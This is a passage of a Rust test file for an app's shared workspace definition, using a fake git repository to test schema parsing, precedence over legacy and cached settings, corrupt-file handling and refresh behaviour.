//! Tests for the shared workspace definition (GH #79).

use super::*;
use crate::project_config::VersionFileKind;
use crate::workspace::WorkspacesFile;
use std::collections::BTreeMap;
use std::cell::RefCell;
use std::collections::HashMap;
use tempfile::TempDir;

// ── A repository without git ───────────────────────────────────────────

thread_local! {
    /// C1 round 2: what this test's [`FakeRepo`] holds, (branch, path) →
    /// text, so [`FakePublisher`] finds the file a publish changes as the
    /// channel does — on the branch, not in a copy the request carries (a
    /// publish of an edit carries none any more).
    ///
    /// Round 4: keyed by the repository too (each [`FakeRepo`] has its own
    /// id), and looked up for the repository this thread read last — a test
    /// with two fakes doesn't publish onto the other one's file.
    static ON_THE_BRANCH: RefCell<HashMap<(u64, String, String), String>> = RefCell::new(HashMap::new());
    static READ_LAST: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
}

static NEXT_FAKE_REPO: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(1);

#[derive(Default)]
struct FakeRepo {
    default_branch: String,
    /// (branch, path) → file at that branch's tip.
    files: RefCell<HashMap<(String, String), RepoFile>>,
    fetched: RefCell<Vec<String>>,
    fetch_error: Option<String>,
    /// Branches that exist without any file this fake knows.
    branches: RefCell<std::collections::HashSet<String>>,
    /// GH #82: what `gh api` says about push access (`None`: can't say).
    permission: RefCell<Option<bool>>,
    /// C1: the commit that last touched a removed path, its author and when.
    touched: RefCell<HashMap<(String, String), (String, Option<String>, Option<i64>)>>,
    /// C1: git can't say whether a path is at a branch's tip.
    cant_say: std::cell::Cell<bool>,
    /// C1 round 2: what the history says of a deleted `workspace.json`.
    deleted: RefCell<Option<Deletion>>,
    /// Round 4: this fake's own id, for [`ON_THE_BRANCH`].
    id: u64,
    /// Round 4: the `since` each history question carried.
    asked_since: RefCell<Vec<Option<String>>>,
    /// C5: branches origin says it doesn't have (fetch answers so), and the
    /// new names GitHub gives renamed ones.
    gone: RefCell<std::collections::HashSet<String>>,
    renamed: RefCell<HashMap<String, String>>,
    /// teamfix round 2: a commit's move trailer.
    moved: RefCell<HashMap<String, String>>,
}

impl FakeRepo {
    fn new() -> Self {
        Self {
            default_branch: "main".to_string(),
            id: NEXT_FAKE_REPO.fetch_add(1, std::sync::atomic::Ordering::Relaxed),
            ..Default::default()
        }
    }

    fn put(&self, branch: &str, path: &str, text: &str, author: &str, commit: &str) {
        ON_THE_BRANCH.with(|files| {
            files.borrow_mut().insert((self.id, branch.to_string(), path.to_string()), text.to_string())
        });
        self.files.borrow_mut().insert(
            (branch.to_string(), path.to_string()),
            RepoFile {
                bytes: text.as_bytes().to_vec(),
                commit: Some(commit.to_string()),
                author: Some(author.to_string()),
                changed_at: Some(1_700_000_000),
            },
        );
    }

    /// Two-instance walk (C3): `put`, with the commit's time.
    fn put_at(&self, branch: &str, text: &str, author: &str, commit: &str, at: i64) {
        self.put(branch, DEFINITION_PATH, text, author, commit);
        if let Some(file) = self.files.borrow_mut().get_mut(&(branch.to_string(), DEFINITION_PATH.to_string())) {
            file.changed_at = Some(at);
        }
    }

    fn remove(&self, branch: &str, path: &str) {
        ON_THE_BRANCH.with(|files| files.borrow_mut().remove(&(self.id, branch.to_string(), path.to_string())));
        self.files
            .borrow_mut()
            .remove(&(branch.to_string(), path.to_string()));
    }

    /// C1: `author` removes `path` from `branch` with `commit`; the branch
    /// stays.
    fn remove_by(&self, branch: &str, path: &str, author: &str, commit: &str) {
        self.remove(branch, path);
        self.branches.borrow_mut().insert(branch.to_string());
        self.touched.borrow_mut().insert(
            (branch.to_string(), path.to_string()),
            (commit.to_string(), Some(author.to_string()), Some(1_700_000_500)),
        );
    }
}

impl RepoSource for FakeRepo {
    fn default_branch(&self) -> String {
        READ_LAST.with(|last| last.set(self.id));
        self.default_branch.clone()
    }
    fn fetch(&self, branch: &str) -> Result<(), String> {
        READ_LAST.with(|last| last.set(self.id));
        if self.gone.borrow().contains(branch) {
            return Err(format!("fatal: couldn't find remote ref refs/heads/{branch}"));
        }
        self.fetched.borrow_mut().push(branch.to_string());
        match &self.fetch_error {
            Some(e) => Err(e.clone()),
            None => Ok(()),
        }
    }
    fn read(&self, branch: &str, path: &str) -> Option<RepoFile> {
        self.files
            .borrow()
            .get(&(branch.to_string(), path.to_string()))
            .cloned()
    }
    fn branch_exists(&self, branch: &str) -> bool {
        self.branches.borrow().contains(branch)
            || self.files.borrow().keys().any(|(b, _)| b == branch)
    }
    fn push_permission(&self) -> Option<bool> {
        *self.permission.borrow()
    }
    fn carries(&self, branch: &str, path: &str) -> Option<bool> {
        (!self.cant_say.get()).then(|| self.read(branch, path).is_some())
    }
    fn last_touch(&self, branch: &str, path: &str) -> Option<(String, Option<String>, Option<i64>)> {
        self.touched.borrow().get(&(branch.to_string(), path.to_string())).cloned()
    }
    fn renamed_to(&self, branch: &str) -> Option<String> {
        self.renamed.borrow().get(branch).cloned()
    }
    fn moved_from(&self, commit: &str) -> Option<String> {
        self.moved.borrow().get(commit).cloned()
    }
    /// The fake has no history: a commit's time is the time it was put at.
    fn committed_at(&self, commit: &str) -> Option<i64> {
        self.files.borrow().values().find(|f| f.commit.as_deref() == Some(commit)).and_then(|f| f.changed_at)
    }
    fn deletion(&self, _branch: &str, _path: &str, since: Option<&str>) -> Deletion {
        self.asked_since.borrow_mut().push(since.map(str::to_string));
        self.deleted.borrow().clone().unwrap_or(Deletion::Never)
    }
}

struct Fixture {
    dir: TempDir,
    workspaces: WorkspaceStore,
    configs: ProjectConfigStore,
    ws_id: String,
}

impl Fixture {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        // Named after its folder, as Open/Add names it: the shared Name
        // fills it in (owner, 2026-10-20).
        let project = dir.path().join("atelier");
        std::fs::create_dir_all(&project).unwrap();
        let workspaces = WorkspaceStore::new(dir.path().join("config")).unwrap();
        let configs = ProjectConfigStore::new(dir.path().join("config")).unwrap();
        let ws = workspaces
            .create("atelier".to_string(), project.to_string_lossy().to_string())
            .unwrap();
        Self {
            dir,
            workspaces,
            configs,
            ws_id: ws.id,
        }
    }

    /// Quit and relaunch: fresh stores over the same files.
    fn restart(self) -> Self {
        let config = self.dir.path().join("config");
        Self {
            workspaces: WorkspaceStore::new(config.clone()).unwrap(),
            configs: ProjectConfigStore::new(config).unwrap(),
            ws_id: self.ws_id,
            dir: self.dir,
        }
    }

    fn queue(&self) -> PublishQueue {
        load_queue(&self.configs, &self.ws_id)
    }

    fn stores(&self) -> Stores<'_> {
        Stores {
            workspaces: &self.workspaces,
            project_configs: &self.configs,
            github_board_allowed: true,
        }
    }

    fn refresh(&self, repo: &FakeRepo) -> RefreshReport {
        refresh_with(&self.stores(), repo, &self.ws_id, RefreshMoment::Periodic).unwrap()
    }

    fn ws(&self) -> Workspace {
        self.workspaces
            .snapshot()
            .workspaces
            .into_iter()
            .find(|w| w.id == self.ws_id)
            .unwrap()
    }

    fn cache(&self) -> Option<DefinitionCache> {
        load_cache(&self.configs, &self.ws_id)
    }
}

const PLY_DEFINITION: &str = r##"{
  "schemaVersion": 1,
  "name": "Ply",
  "accentColor": "#7c3aed",
  "board": "githubIssues",
  "githubOwnerRepo": "MatteoB-adv/atelier",
  "versionFiles": [
    { "path": "package.json", "kind": "package_json" },
    { "path": "src-tauri/Cargo.toml", "kind": "cargo_toml" }
  ],
  "installScript": "scripts/install-local.sh",
  "verifyPipeline": [{ "kind": "script", "path": "scripts/ppvp.sh" }]
}
"##;

const PLY_LEGACY: &str = r##"{
  "name": "Ply",
  "accentColor": "#7c3aed",
  "layoutPreset": null,
  "kanbanSyncMode": "githubIssues",
  "githubOwnerRepo": "MatteoB-adv/atelier"
}"##;

/// 1.173.0 (B1): the app at the root, the site in its folder.
const TWO_AREAS: &str = r#"[
    { "id": "app", "name": "App", "path": "/", "targetBranch": "staging" },
    { "id": "site", "name": "Site", "path": "lyrappc-astro/", "targetBranch": "main",
      "versionFiles": [{ "path": "lyrappc-astro/package.json", "kind": "package_json" }] }
  ]"#;

/// [`PLY_DEFINITION`] with `areas` set to `areas` (JSON).
fn with_areas(areas: &str) -> String {
    PLY_DEFINITION.replace("\"installScript\"", &format!("\"areas\": {areas},\n  \"installScript\""))
}

fn with_verify(script: &str) -> String {
    PLY_DEFINITION.replace("scripts/ppvp.sh", script)
}

// ── Schema ────────────────────────────────────────────────────────────

#[test]
fn schema_round_trips_every_field() {
    let def = WorkspaceDefinition {
        schema_version: 1,
        name: "Ply".into(),
        accent_color: Some("#7c3aed".into()),
        board: KanbanSyncMode::GitHubIssues,
        github_owner_repo: Some("MatteoB-adv/atelier".into()),
        integration_branch: Some("staging".into()),
        version_files: Some(vec![VersionFileEntry {
            path: "main.py".into(),
            kind: VersionFileKind::PythonModuleVar,
            variable_name: Some("version".into()),
        }]),
        install_script: Some("scripts/install-local.sh".into()),
        try_command: Some("npm run dev".into()),
        verify_pipeline: Some(vec![
            VerifyKind::Script {
                path: "scripts/ppvp.sh".into(),
            },
            VerifyKind::SlashCommand {
                name: "ppvp".into(),
                args: vec!["--staging".into()],
            },
        ]),
        cache_paths: Some(vec!["website/.astro".into()]),
        shared_build_cache: Some(false),
        self_check: Some(false),
        review_checklist: Some(vec![ReviewChecklistClass {
            name: "Branch discovery".into(),
            sentence: "Every branch lookup names the remote it reads.".into(),
        }]),
        worktree_copy: Some(vec![".env".into(), "apps/*/.env.local".into()]),
        worktree_setup: Some("npm ci".into()),
        library: None,
        models: None,
        areas: Some(vec![
            crate::areas::AreaDef {
                id: "app".into(),
                name: "App".into(),
                path: "".into(),
                target_branch: Some("staging".into()),
                ..Default::default()
            },
            crate::areas::AreaDef {
                id: "site".into(),
                name: "Site".into(),
                path: "lyrappc-astro".into(),
                target_branch: Some("main".into()),
                version_files: Some(vec![VersionFileEntry {
                    path: "lyrappc-astro/package.json".into(),
                    kind: VersionFileKind::PackageJson,
                    variable_name: None,
                }]),
                tag_prefix: Some("site-".into()),
                label: Some("area:site".into()),
                look_at: Some("https://www.lyrappc.com".into()),
                release_kind: Some("push_only".to_string()),
                extra: BTreeMap::new(),
            },
        ]
        .into()),
        release_kind: Some("github".to_string()),
        extra: BTreeMap::new(),
    };
    let text = serde_json::to_string_pretty(&def).unwrap();
    for key in [
        "schemaVersion",
        "accentColor",
        "\"board\": \"githubIssues\"",
        "githubOwnerRepo",
        "integrationBranch",
        "versionFiles",
        "installScript",
        "tryCommand",
        "verifyPipeline",
        "cachePaths",
        "sharedBuildCache",
        "selfCheck",
        "reviewChecklist",
        "worktreeCopy",
        "worktreeSetup",
        "areas",
        "targetBranch",
        "tagPrefix",
        "lookAt",
        "\"releaseKind\": \"push_only\"",
        "\"releaseKind\": \"github\"",
    ] {
        assert!(text.contains(key), "{key} missing from {text}");
    }
    assert_eq!(parse_definition(text.as_bytes()).unwrap(), def);
}

#[test]
fn a_definition_with_unknown_extra_keys_loads_and_keeps_them() {
    let text =
        r#"{ "name": "Ply", "board": "local", "knowledge": { "shared": true }, "futureFlag": 3 }"#;
    let def = parse_definition(text.as_bytes()).unwrap();
    assert_eq!(def.name, "Ply");
    assert_eq!(def.schema_version, 1, "absent schemaVersion reads as 1");
    assert!(!def.has_project());
    assert_eq!(def.extra.get("futureFlag"), Some(&Value::from(3)));
    let rewritten = serde_json::to_string(&def).unwrap();
    assert!(rewritten.contains("\"knowledge\":{\"shared\":true}"));
}

#[test]
fn a_broken_file_names_its_line_and_a_newer_schema_is_refused() {
    let bad = parse_definition(b"{\n  \"name\": \"Ply\",\n  \"board\": oops\n}").unwrap_err();
    assert_eq!(bad.line, Some(3));
    assert_eq!(bad.summary(), "unreadable (line 3)");

    let newer = parse_definition(br#"{ "schemaVersion": 2, "name": "Ply" }"#).unwrap_err();
    assert_eq!(newer.line, None);
    assert!(newer.message.contains("newer Plyloft"));
}

#[test]
fn workspace_default_converts_field_for_field() {
    let legacy: WorkspaceDefault = serde_json::from_str(PLY_LEGACY).unwrap();
    let def = from_legacy(&legacy, None);
    assert_eq!(def.name, "Ply");
    assert_eq!(def.accent_color.as_deref(), Some("#7c3aed"));
    assert_eq!(def.board, KanbanSyncMode::GitHubIssues);
    assert_eq!(
        def.github_owner_repo.as_deref(),
        Some("MatteoB-adv/atelier")
    );
    assert!(
        !def.has_project(),
        "the legacy file never carried project config"
    );

    let cfg = crate::project_config::default_atelier_config();
    let def = from_legacy(&legacy, Some(&cfg));
    assert_eq!(def.integration_branch.as_deref(), Some("main"));
    assert_eq!(def.version_files.as_ref(), Some(&cfg.version_files));
    assert_eq!(def.install_script, cfg.install_script);
    assert_eq!(def.verify_pipeline, cfg.verify_pipeline);
    assert_eq!(def.shared_build_cache, Some(true));
}

// ── Precedence ────────────────────────────────────────────────────────

#[test]
fn workspace_json_wins_over_workspace_default_in_the_repo() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put(
        "main",
        LEGACY_PATH,
        &PLY_LEGACY.replace("\"Ply\"", "\"Legacy\""),
        "a",
        "c1",
    );
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "b", "c2");
    let report = fx.refresh(&repo);
    assert_eq!(report.source, Some(DefinitionSource::Repo));
    assert_eq!(fx.ws().name, "Ply");
    assert_eq!(fx.cache().unwrap().commit.as_deref(), Some("c2"));
}

#[test]
fn the_repo_wins_over_the_cache_and_the_cache_over_legacy() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();

    // Legacy only: converted into the cache and applied.
    repo.put("main", LEGACY_PATH, PLY_LEGACY, "test-owner", "c1");
    let report = fx.refresh(&repo);
    assert_eq!(report.source, Some(DefinitionSource::Legacy));
    assert_eq!(fx.ws().name, "Ply");
    assert_eq!(fx.ws().kanban_sync_mode, KanbanSyncMode::GitHubIssues);

    // A workspace.json appears: it replaces the converted cache.
    repo.put(
        "main",
        DEFINITION_PATH,
        &PLY_DEFINITION.replace("\"Ply\"", "\"Ply repo\""),
        "x",
        "c2",
    );
    fx.refresh(&repo);
    assert_eq!(fx.ws().name, "Ply repo");
    assert_eq!(fx.cache().unwrap().source, DefinitionSource::Repo);

    // A local value that drifted (hand-edited config, say) is replaced.
    let mut cfg = fx.configs.get(&fx.ws_id).unwrap();
    cfg.install_script = Some("scripts/other.sh".into());
    fx.configs.set(&fx.ws_id, cfg).unwrap();
    let report = fx.refresh(&repo);
    assert_eq!(
        report
            .changes
            .iter()
            .map(|c| c.field.as_str())
            .collect::<Vec<_>>(),
        vec!["installScript"]
    );
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().install_script.as_deref(),
        Some("scripts/install-local.sh")
    );

    // The branch can't be read (file gone, or nothing fetched): the cache
    // stays, nothing changes.
    repo.remove("main", DEFINITION_PATH);
    repo.remove("main", LEGACY_PATH);
    let report = fx.refresh(&repo);
    assert!(report.has_definition);
    assert!(report.changes.is_empty());
    assert_eq!(fx.ws().name, "Ply repo");
}

#[test]
fn an_absent_integration_branch_means_the_repos_default_branch() {
    let fx = Fixture::new();
    let mut repo = FakeRepo::new();
    repo.default_branch = "trunk".into();
    repo.put("trunk", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    let cfg = fx.configs.get(&fx.ws_id).unwrap();
    assert_eq!(cfg.target_branch, "trunk");
    assert_eq!(cfg.version_files.len(), 2);
    assert_eq!(
        cfg.install_script.as_deref(),
        Some("scripts/install-local.sh")
    );
    assert!(cfg.shared_build_cache, "absent sharedBuildCache is on");
    assert_eq!(*repo.fetched.borrow(), vec!["trunk".to_string()]);
}

#[test]
fn a_named_integration_branch_is_where_the_definition_is_read() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let on_main = PLY_DEFINITION.replace(
        "\"schemaVersion\": 1,",
        "\"schemaVersion\": 1, \"integrationBranch\": \"staging\",",
    );
    repo.put("main", DEFINITION_PATH, &on_main, "a", "c1");
    repo.put(
        "staging",
        DEFINITION_PATH,
        &with_verify("scripts/staging.sh").replace(
            "\"schemaVersion\": 1,",
            "\"schemaVersion\": 1, \"integrationBranch\": \"staging\",",
        ),
        "b",
        "c2",
    );
    fx.refresh(&repo);
    let cfg = fx.configs.get(&fx.ws_id).unwrap();
    assert_eq!(cfg.target_branch, "staging");
    assert_eq!(
        cfg.verify_pipeline,
        Some(vec![VerifyKind::Script {
            path: "scripts/staging.sh".into()
        }])
    );
    // The next refresh reads staging directly.
    repo.fetched.borrow_mut().clear();
    fx.refresh(&repo);
    assert_eq!(*repo.fetched.borrow(), vec!["staging".to_string()]);
}

#[test]
fn a_failed_fetch_still_reads_the_last_fetched_tip() {
    let fx = Fixture::new();
    let mut repo = FakeRepo::new();
    repo.fetch_error = Some("offline".into());
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    let report = fx.refresh(&repo);
    assert_eq!(report.fetch_error.as_deref(), Some("offline"));
    assert_eq!(fx.ws().name, "Ply");
}

// ── Changes and their author ──────────────────────────────────────────

#[test]
fn a_changed_field_reports_its_author_and_label() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "someone", "c1");
    // T6 (team walk): the first read sets this Mac up; nobody "changed" it.
    let first = fx.refresh(&repo);
    assert!(first.first_read, "{first:?}");
    assert!(!first.changes.is_empty(), "the first read applied the definition");

    repo.put(
        "main",
        DEFINITION_PATH,
        &with_verify("scripts/verify.sh"),
        "test-owner",
        "c2",
    );
    let report = fx.refresh(&repo);
    assert!(!report.first_read, "a cached definition was there before");
    assert_eq!(report.author.as_deref(), Some("test-owner"));
    assert_eq!(report.commit.as_deref(), Some("c2"));
    assert_eq!(
        report.changes,
        vec![FieldChange {
            field: "verifyPipeline".into(),
            label: "Checks before shipping".into(),
            value: serde_json::json!([{ "kind": "script", "path": "scripts/verify.sh" }]),
            previous: Value::Null,
        }]
    );
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script {
            path: "scripts/verify.sh".into()
        }])
    );

    // Nothing changed since: nothing to announce.
    assert!(fx.refresh(&repo).changes.is_empty());
}

#[test]
fn a_definition_without_a_project_part_leaves_the_local_config_alone() {
    let fx = Fixture::new();
    let mut cfg = crate::project_config::default_atelier_config();
    cfg.target_branch = "develop".into();
    fx.configs.set(&fx.ws_id, cfg.clone()).unwrap();
    let repo = FakeRepo::new();
    repo.put(
        "main",
        DEFINITION_PATH,
        r#"{ "name": "Shared", "board": "local" }"#,
        "a",
        "c1",
    );
    let report = fx.refresh(&repo);
    assert_eq!(
        report
            .changes
            .iter()
            .map(|c| c.field.as_str())
            .collect::<Vec<_>>(),
        vec!["name"]
    );
    let after = fx.configs.get(&fx.ws_id).unwrap();
    assert_eq!(after.target_branch, "develop");
    assert_eq!(after.version_files, cfg.version_files);
}

// ── Corrupt file ──────────────────────────────────────────────────────

#[test]
fn a_corrupt_file_keeps_the_cache_and_never_writes_the_repo() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    let good = fx.cache().unwrap();

    repo.put(
        "main",
        DEFINITION_PATH,
        "{\n  \"name\": \"Ply\",\n  \"verifyPipeline\": [,\n}",
        "b",
        "c2",
    );
    let report = fx.refresh(&repo);
    let bad = report.unreadable.clone().expect("unreadable reported");
    assert_eq!(bad.line, Some(3));
    assert_eq!(bad.commit.as_deref(), Some("c2"));
    assert!(report.changes.is_empty());

    let cache = fx.cache().unwrap();
    assert_eq!(
        cache.definition, good.definition,
        "the last good copy stays"
    );
    assert_eq!(cache.commit.as_deref(), Some("c1"));
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().verify_pipeline,
        Some(vec![VerifyKind::Script {
            path: "scripts/ppvp.sh".into()
        }])
    );

    // A local edit meanwhile stays pending and is never published over the
    // broken file.
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    let view = record_local_edit(&fx.stores(), &repo, &fx.ws_id, false)
        .unwrap()
        .unwrap();
    assert_eq!(view.cache.pending_state, Some(PendingState::PendingSync));
    assert!(queue_definition(&fx.stores(), &fx.ws_id).is_err());
    let publisher = FakePublisher::default();
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id)
        .unwrap()
        .unwrap();
    assert!(publisher.requests.borrow().is_empty());
    assert!(report.error.unwrap().contains("unreadable (line 3)"));
    assert!(fx.cache().unwrap().pending.contains_key("name"));

    let row = crate::doctor::shared_definition_status("Ply", &cache, &PublishQueue::default(), &[])
        .unwrap();
    assert_eq!(row.state, "unreadable");
    assert_eq!(row.summary, "unreadable (line 3)");

    // Fixed in the repo: the row clears and the file is used again.
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "b", "c3");
    assert!(fx.refresh(&repo).unreadable.is_none());
}

#[test]
fn a_corrupt_file_with_no_cache_changes_nothing_but_shows_the_row() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, "not json", "a", "c1");
    let report = fx.refresh(&repo);
    assert!(!report.has_definition);
    assert!(report.unreadable.is_some());
    assert_eq!(fx.ws().name, "atelier");
    let row = crate::doctor::shared_definition_status(
        "atelier",
        &fx.cache().unwrap(),
        &PublishQueue::default(),
        &[],
    )
    .unwrap();
    assert_eq!(row.state, "unreadable");
}

// ── Tier 2: persisted state ───────────────────────────────────────────

#[test]
fn a_mac_with_a_v1_config_and_no_definition_loads_unchanged() {
    let fx = Fixture::new();
    let dir = fx.configs.workspace_dir(&fx.ws_id);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("config.json"),
        br#"{ "schemaVersion": 1, "targetBranch": "develop",
              "versionFiles": [{ "path": "package.json", "kind": "package_json" }],
              "verifyScript": "scripts/test.sh", "createdAt": 5, "updatedAt": 6 }"#,
    )
    .unwrap();
    let before_disk = std::fs::read(dir.join("config.json")).unwrap();
    let before = fx.configs.get(&fx.ws_id).unwrap();

    let repo = FakeRepo::new(); // LYRA: no workspace.json, no legacy file
    let report = fx.refresh(&repo);
    assert!(!report.has_definition);
    assert!(report.changes.is_empty());
    assert!(
        fx.cache().is_none(),
        "no cache file for a repo without a definition"
    );
    assert_eq!(std::fs::read(dir.join("config.json")).unwrap(), before_disk);
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap(), before);
    assert_eq!(before.target_branch, "develop");

    // A local edit on such a workspace records nothing either.
    assert!(record_local_edit(&fx.stores(), &repo, &fx.ws_id, false)
        .unwrap()
        .is_none());
}

#[test]
fn the_cache_file_round_trips_and_loads_without_optional_fields() {
    let fx = Fixture::new();
    let path = cache_path(&fx.configs, &fx.ws_id);
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(&path, br#"{ "schemaVersion": 1 }"#).unwrap();
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_none() && cache.pending.is_empty());
    // GH #82 Tier 2: a cache written before `writeAccess` existed is not
    // read-only — unknown permission never locks the editor.
    assert_eq!(cache.write_access, WriteAccess::default());
    assert!(!cache.write_access.read_only());

    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    fx.refresh(&repo);
    let bytes = std::fs::read(&path).unwrap();
    let parsed: DefinitionCache = serde_json::from_slice(&bytes).unwrap();
    assert_eq!(Some(parsed), fx.cache());
    // 1.173.0 (B1): a cached definition with areas round-trips too.
    repo.put("main", DEFINITION_PATH, &with_areas(TWO_AREAS), "a", "c2");
    fx.refresh(&repo);
    let parsed: DefinitionCache = serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap();
    assert_eq!(
        parsed.definition.as_ref().and_then(|d| d.areas.as_ref()).and_then(|a| a.valid()).map(<[_]>::len),
        Some(2)
    );
    assert_eq!(Some(parsed), fx.cache());
    assert!(!path
        .with_file_name("workspace_definition.json.atelier-tmp")
        .exists());
}

// ── Local edits ───────────────────────────────────────────────────────

// ── The four refresh moments ──────────────────────────────────────────

#[test]
fn the_four_refresh_moments_go_through_refresh_definition() {
    // Sync and Start build call it in the backend…
    let commands = include_str!("commands.rs");
    // The function's whole body: from its signature to the first line that
    // closes it (`}` at the start of a line).
    let body_of = |name: &str| {
        let start = commands
            .find(name)
            .unwrap_or_else(|| panic!("{name} not found"));
        let end = commands[start..].find("\n}\n").map(|i| start + i).unwrap_or(commands.len());
        &commands[start..end]
    };
    assert!(body_of("pub async fn kanban_github_reconcile(").contains("RefreshMoment::Sync"));
    // GH #222 review 3: before CARD_START_LOCK, in `builder_start` itself —
    // the refresh is read before the start that runs under the lock.
    let build = body_of("pub async fn builder_start(");
    let refresh = build.find("RefreshMoment::StartBuild").expect("the refresh is in builder_start");
    let locked_start = build.find("builder_start_blocking(").expect("the start under CARD_START_LOCK");
    assert!(refresh < locked_start, "the refresh comes before the start under CARD_START_LOCK");
    // …open and the periodic read through the one IPC, which calls it too.
    assert!(body_of("pub async fn workspace_definition_refresh(")
        .contains("workspace_definition::refresh_definition(&app, &workspace_id, moment)"));
    let module = include_str!("workspace_definition.rs");
    assert!(module.contains("refresh_with(stores, repo, workspace_id, moment)"));
    let scheduler = include_str!("../../src/lib/definitionRefresh.ts");
    assert!(scheduler.contains("\"open\"") && scheduler.contains("\"periodic\""));
    // The frontend's reads have one door, which the warmed timer and the report
    // listener really use, and the pages read through it without draining.
    let app = include_str!("../../src/App.tsx");
    assert!(app.contains("new DefinitionRefreshScheduler("));
    assert!(app.contains("void readDefinition(id, moment, { quiet: true });"));
    assert!(app.contains("noteDefinitionRead(report);"));
    assert!(!app.contains("workspaceDefinitionRefresh"), "App reads through the store");
    let store = include_str!("../../src/store/definitionReadStore.ts");
    assert!(store.contains("workspaceDefinitionRefresh(workspaceId, moment)"));
    assert!(store.contains("moment: RefreshMoment = \"pageRead\""));
    assert!(scheduler.contains("\"pageRead\""));
    let overlay = include_str!("../../src/components/SettingsOverlay.tsx");
    assert!(overlay.contains("useProjectPageReads(activeId,"));
    let page_reads = include_str!("../../src/hooks/useProjectPageReads.ts");
    assert!(page_reads.contains("readDefinitionIfDue(workspaceId,"));
    let team = include_str!("../../src/components/settings/TeamPage.tsx");
    assert!(team.contains("readDefinition(activeWorkspaceId)"));
    // The frontend's interval is this module's.
    assert!(scheduler.contains(&format!("{} * 1000", REFRESH_INTERVAL_SECS)));

    // Every moment is the same read.
    for moment in [
        RefreshMoment::Open,
        RefreshMoment::Sync,
        RefreshMoment::StartBuild,
        RefreshMoment::Periodic,
        RefreshMoment::PageRead,
    ] {
        let fx = Fixture::new();
        let repo = FakeRepo::new();
        repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
        let report = refresh_with(&fx.stores(), &repo, &fx.ws_id, moment).unwrap();
        assert_eq!(report.moment, moment);
        assert_eq!(fx.ws().name, "Ply");
        let json = serde_json::to_value(moment).unwrap();
        assert!(["open", "sync", "startBuild", "periodic", "pageRead"].contains(&json.as_str().unwrap()));
    }
}

#[test]
fn import_reads_workspace_json_before_workspace_default() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join(".atelier")).unwrap();
    std::fs::write(
        dir.path().join(LEGACY_PATH),
        PLY_LEGACY.replace("\"Ply\"", "\"Old\""),
    )
    .unwrap();
    assert_eq!(
        read_checkout_identity(dir.path()).unwrap().unwrap().name,
        "Old"
    );
    std::fs::write(dir.path().join(DEFINITION_PATH), PLY_DEFINITION).unwrap();
    let identity = read_checkout_identity(dir.path()).unwrap().unwrap();
    assert_eq!(identity.name, "Ply");
    assert_eq!(identity.kanban_sync_mode, KanbanSyncMode::GitHubIssues);

    let store = WorkspaceStore::new(dir.path().join("cfg")).unwrap();
    let ws = store.import_default(dir.path()).unwrap().unwrap();
    assert_eq!(ws.name, "Ply");
}

#[test]
fn git_repo_reads_the_integration_branch_tip_not_the_checkout() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();
    let git = |args: &[&str]| {
        let out = crate::platform::git_command()
            .args(args)
            .current_dir(root)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "git {args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    };
    git(&["init", "-q", "-b", "main"]);
    git(&["config", "user.email", "t@example.com"]);
    git(&["config", "user.name", "test-owner"]);
    std::fs::create_dir_all(root.join(".atelier")).unwrap();
    std::fs::write(root.join(DEFINITION_PATH), PLY_DEFINITION).unwrap();
    git(&["add", "."]);
    git(&["commit", "-q", "-m", "definition"]);
    git(&["checkout", "-q", "-b", "feature"]);
    std::fs::write(root.join(DEFINITION_PATH), "dirty and on another branch").unwrap();

    let repo = GitRepo {
        cwd: root.to_path_buf(),
    };
    assert_eq!(repo.default_branch(), "main");
    assert!(repo.fetch("main").is_ok(), "no origin: nothing to fetch");
    let file = repo.read("main", DEFINITION_PATH).unwrap();
    assert_eq!(file.bytes, PLY_DEFINITION.as_bytes());
    assert_eq!(file.author.as_deref(), Some("test-owner"));
    assert!(repo.read("main", LEGACY_PATH).is_none());
}

// ── Review round 1 (snapshot 1) ───────────────────────────────────────

#[test]
fn the_editor_can_add_a_project_part_to_a_definition_without_one() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put(
        "main",
        DEFINITION_PATH,
        r#"{ "name": "Shared", "board": "local" }"#,
        "a",
        "c1",
    );
    fx.refresh(&repo);

    let mut edited = fx.cache().unwrap().definition.unwrap();
    edited.verify_pipeline = Some(vec![VerifyKind::Script {
        path: "scripts/test.sh".into(),
    }]);
    let view = save(&fx.stores(), &repo, &fx.ws_id, edited).unwrap();
    assert!(view.cache.pending.contains_key("verifyPipeline"));
    assert_eq!(view.cache.pending_state, Some(PendingState::PendingSync));
    assert!(view.queue.fields.contains_key("verifyPipeline"));

    // A later rename keeps the project edit pending, and a refresh keeps it.
